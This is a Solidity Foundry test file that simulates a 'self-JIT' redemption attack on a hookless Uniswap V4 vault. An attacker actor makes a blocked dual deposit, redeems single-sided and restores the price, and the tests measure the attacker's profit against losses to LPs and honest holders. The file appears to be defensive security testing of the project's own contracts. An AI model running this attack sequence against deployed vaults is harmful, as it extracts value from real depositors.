// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";
import {console2} from "forge-std/console2.sol";
import {TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault_Acceptance as Acceptance} from "contracts/vaults/standard/exchange/protocols/uniswap/v4/fullSpread/hookless/test/bases/TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault_Acceptance.sol";
import {TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault as HBase} from "contracts/vaults/standard/exchange/protocols/uniswap/v4/fullSpread/hookless/test/bases/TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault.sol";
import {ERC20PermitMintableStub} from "@crane/contracts/tokens/ERC20/ERC20PermitMintableStub.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IHooks} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IHooks.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {Currency} from "@crane/contracts/protocols/dexes/uniswap/v4/types/Currency.sol";
import {IStandardExchangeProxy} from "contracts/interfaces/proxies/IStandardExchangeProxy.sol";
import {SJHandler} from "./SJHandler.sol";
import {SJSuite} from "./SJBase.sol";

interface ISJView { function deployedReserve() external view returns (uint256, uint256); }

/// SELF-JIT on idle single-sided redemption (fz-fs-self-jit-redeem).
/// Hookless V4 FullSpread vault, 20% sleeve. Bootstrap LP (this) 1000/1000, three honest holders and the attacker
/// (actor 3) each 400e18 shares from fair dual deposits at P0 (pre-attack). External full-range L configurable.
/// The attacker only uses public vault entry points + pool swaps; every action ends with the ATTACKER restoring
/// the pool to P0 at its own cost (handler _end). Values are at P0 = 1 (both tokens 18 dec).
contract SJHooklessTest is Acceptance, SJSuite {
    uint256 constant CAP = 1e27;

    function _extLiquidity() internal pure virtual returns (uint128) { return 1_000e18; }
    function _feeTier() internal pure virtual returns (uint24) { return 3_000; }
    function _vaultAddr() internal view override returns (address) { return address(vault); }

    function setUp() public virtual override {
        HBase.setUp();
        IERC20 a = IERC20(address(new ERC20PermitMintableStub("Pair A", "A", 18, address(this), 1e32)));
        IERC20 b = IERC20(address(new ERC20PermitMintableStub("Pair B", "B", 18, address(this), 1e32)));
        bool ordered = address(a) < address(b);
        token0 = ordered ? a : b; token1 = ordered ? b : a;
        unit0 = 1e18; unit1 = 1e18;
        poolKey = PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)), _feeTier(), _tickSpacing(), IHooks(address(0)));
        poolManager.initialize(poolKey, uint160(1 << 96));
        _seedPool(_extLiquidity());
        vault = IStandardExchangeProxy(uniswapV4StandardExchangeDFPkg.deployVault(poolKey));
        token0.approve(address(vault), type(uint256).max);
        token1.approve(address(vault), type(uint256).max);
        vm.recordLogs();
        _bootstrap();
        (int24 lo, int24 hi, bytes32 salt) = _findPosition(vm.getRecordedLogs(), address(poolManager), address(vault));
        handler = new SJHandler(poolManager, poolKey, address(vault), token0, token1, lo, hi, salt, 100, address(this));
        token0.approve(address(handler), type(uint256).max);
        token1.approve(address(handler), type(uint256).max);
        handler.setup_fund(CAP);
        for (uint256 i; i < 4; ++i) handler.setup_seedShares(i, 400e18);
        // record-only (do not abort inside the handler); the test asserts the economics itself
        handler.setQuarantineSelfJit(true);
        handler.setQuarantineDump(true);
        handler.setQuarantineBseP0(true);
        handler.keeper_rebalance(); // normal, keeper-maintained state
    }

    struct R { int256 att; int256 lp0; int256 honest; uint256 navPs0; uint256 navPs1; uint256 sharesLeft; }

    function _honest() internal view returns (uint256 s) { for (uint256 i; i < 3; ++i) s += handler.valueOf(handler.actorAt(i)); }

    function _logState(string memory tag) internal view {
        (uint256 d0, uint256 d1) = ISJView(address(vault)).deployedReserve();
        console2.log(tag);
        console2.log("  free0/free1", token0.balanceOf(address(vault)), token1.balanceOf(address(vault)));
        console2.log("  deployed0/deployed1", d0, d1);
        console2.log("  NAV / S", handler.nav(), IERC20(address(vault)).totalSupply());
    }

    /// mode 0: single-sided redeem of ALL attacker shares to token0 (z=true) / token1; mode 1: pro-rata dual exit (control)
    function _cycle(uint256 extraDeposit, bool z, uint8 mode, bool dbg) internal returns (R memory r) {
        address a = handler.actorAt(3);
        uint256 v0 = handler.valueOf(a);
        uint256 l0 = handler.valueOf(address(this));
        uint256 h0 = _honest();
        r.navPs0 = handler.nav() * 1e18 / handler.supply();
        if (extraDeposit != 0) handler.setup_seedShares(3, extraDeposit); // fair dual deposit at book ratio, at P0
        require(handler.priceAtP0(), "deposit moved price");
        if (dbg) handler.setDebug(true);
        if (mode == 0) handler.h_redeemSingle(3, z, 10_000);
        else handler.h_exitDual(3, 10_000);
        handler.setDebug(false);
        require(handler.priceAtP0(), "not restored");
        r.sharesLeft = IERC20(address(vault)).balanceOf(a);
        r.att = int256(handler.valueOf(a)) - int256(v0);
        r.lp0 = int256(handler.valueOf(address(this))) - int256(l0);
        r.honest = int256(_honest()) - int256(h0);
        r.navPs1 = handler.nav() * 1e18 / handler.supply();
    }

    function _print(string memory tag, R memory r) internal pure {
        console2.log(tag);
        console2.log("  attacker net @P0 (incl. own restore) / LP0 delta / honest holders delta");
        console2.logInt(r.att); console2.logInt(r.lp0); console2.logInt(r.honest);
        console2.log("  NAV/share before / after, attacker shares left", r.navPs0, r.navPs1, r.sharesLeft);
    }

    function _grid(bool withBlockedPrefix) internal {
        uint256[4] memory sz = [uint256(0), 400e18, 1_000e18, 2_000e18];
        _logState("START");
        for (uint256 k; k < sz.length; ++k) {
            for (uint256 m; m < 3; ++m) {
                uint256 snap = vm.snapshotState();
                if (withBlockedPrefix) handler.b_depositDual(0, 32957); // honest integrator blocked dual deposit
                R memory r = _cycle(sz[k], m == 0, m == 2 ? 1 : 0, false);
                console2.log("== extra deposit", sz[k] / 1e18, m == 0 ? "redeem->t0" : (m == 1 ? "redeem->t1" : "dualExit(control)"));
                _print("", r);
                vm.revertToState(snap);
            }
        }
    }


    /// Q-campaign counterexample B shape: the ATTACKER (actor 3) makes the blocked (in-session, at P0) dual
    /// deposit itself, which skips best-effort maintenance and leaves two-sided idle excess; then it redeems
    /// single-sided (SY redeem / exchangeIn) and restores. Control rows: no blocked prefix; blocked prefix + dual exit.
    function _attackerBlockedThen(uint256 amtSeed, uint8 mode, uint256 frac, bool prefix) internal returns (int256 att, int256 lp0, int256 hon) {
        address a = handler.actorAt(3);
        uint256 v0 = handler.valueOf(a);
        uint256 l0 = handler.valueOf(address(this));
        uint256 h0 = _honest();
        if (prefix) handler.b_depositDual(3, amtSeed);
        if (mode == 0) handler.h_syRedeem(3, true, frac);
        else if (mode == 1) handler.h_redeemSingle(3, true, frac);
        else if (mode == 2) handler.h_syRedeem(3, false, frac);
        else handler.h_exitDual(3, frac);
        require(handler.priceAtP0(), "not restored");
        att = int256(handler.valueOf(a)) - int256(v0);
        lp0 = int256(handler.valueOf(address(this))) - int256(l0);
        hon = int256(_honest()) - int256(h0);
    }

    function test_sj_attackerBlockedPrefix() public {
        uint256[3] memory amts = [uint256(32957), type(uint256).max / 2, 300e18];
        uint256[3] memory fracs = [uint256(8390), 10_000, 5_000];
        for (uint256 i; i < amts.length; ++i) {
            for (uint256 f; f < fracs.length; ++f) {
                for (uint8 m; m < 5; ++m) {
                    uint256 snap = vm.snapshotState();
                    bool prefix = m != 4;
                    (int256 att, int256 lp0, int256 hon) = _attackerBlockedThen(amts[i], m == 4 ? 0 : m, fracs[f], prefix);
                    console2.log("== blockedDual amtSeed idx / frac / mode(0 syRedeem->t0,1 redeem->t0,2 syRedeem->t1,3 dualExit,4 NO-prefix syRedeem->t0)", i, fracs[f], m);
                    console2.logInt(att); console2.logInt(lp0); console2.logInt(hon);
                    vm.revertToState(snap);
                }
            }
        }
    }


    /// Duplicate-evidence assertion: the self-displaced redeploy is only profitable when blocked-mode dual-deposit
    /// excess (fs-maintenance-at-spot-jit precondition) is present. Without it the redeemer loses and LPs gain.
    function test_sj_assert_needsBlockedExcess() public {
        uint256 snap = vm.snapshotState();
        (int256 attNo, int256 lpNo,) = _attackerBlockedThen(0, 0, 10_000, false);
        vm.revertToState(snap);
        (int256 attB, int256 lpB, int256 honB) = _attackerBlockedThen(32957, 0, 10_000, true); // bound -> ~nav/5 idle two-sided excess
        console2.log("no prefix: attacker / LP0"); console2.logInt(attNo); console2.logInt(lpNo);
        console2.log("blocked-dual prefix: attacker / LP0 / honest"); console2.logInt(attB); console2.logInt(lpB); console2.logInt(honB);
        assertLt(attNo, 0, "self-JIT without blocked excess should not profit");
        assertGt(lpNo, 0, "LPs gain without blocked excess");
        if (_feeTier() == 500 && _extLiquidity() == 1_000e18) {
            assertGt(attB, 1e18, "attacker profit with blocked excess");
            assertLt(lpB, -1e18, "LP0 loss with blocked excess");
        }
    }

    function test_sj_grid_clean() public { _grid(false); }
    function test_sj_grid_afterBlockedDual() public { _grid(true); }

    function test_sj_trace() public {
        _logState("BEFORE");
        R memory r = _cycle(1_000e18, false, 0, true);
        _logState("AFTER");
        _print("trace redeem->t1, extra 1000", r);
    }
}

/// 0.05% fee tier
contract SJHookless500Test is SJHooklessTest {
    function _feeTier() internal pure override returns (uint24) { return 500; }
    function _tickSpacing() internal pure override returns (int24) { return 10; }
}

/// deeper external liquidity (vault ~ 15% of active L), 0.05%
contract SJHookless500DeepTest is SJHooklessTest {
    function _feeTier() internal pure override returns (uint24) { return 500; }
    function _tickSpacing() internal pure override returns (int24) { return 10; }
    function _extLiquidity() internal pure override returns (uint128) { return 10_000e18; }
}
